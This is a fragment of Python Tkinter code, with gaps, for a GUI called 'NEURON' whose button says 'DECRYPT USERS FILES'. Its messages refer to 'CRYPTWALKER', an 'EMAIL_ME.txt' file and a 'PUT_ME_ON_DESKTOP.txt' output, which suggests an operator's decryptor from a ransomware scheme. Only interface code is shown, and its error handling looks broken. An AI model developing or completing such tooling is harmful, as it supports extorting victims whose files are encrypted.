...
class App(tk.Tk):
    def __init__(self):
        ...
        # heading
        heading = tk.Label(self, text='NEURON v1.0.1 [MUTED_ECLIPSE]', font=('Helvetica', 13), background='#2e3440', foreground="white")
        heading.grid(column=0, row=1, columnspan=2, pady=5, sticky=tk.N)

        # Gen button
        login_button = tk.Button(self, text="DECRYPT USERS FILES", font=('Helvetica', 13),activebackground='#4c566a',activeforeground='white', background='#2e3440', foreground="white", command=lambda: self.gen_rsa())
        login_button.grid(column=0, row=3, sticky=tk.N, padx=5, pady=5)


    def gen_rsa(self):
        gen_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[~] NEURON >> Attempting to decrypt...")
        ...
        try:
            ...
            gen2_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[!!!] CRYPTWALKER >> File 'EMAIL_ME.txt' was not found")
            gen2_label.grid(column=0, row=5, sticky=tk.W)
        finally:
            f.close()
        gen2_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[~] CRYPTWALKER >> File decrypted, saving to 'PUT_ME_ON_DESKTOP.txt")
        gen2_label.grid(column=0, row=5, sticky=tk.W)
        
        gen3_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[~] CRYPTWALKER >> Done! :)")
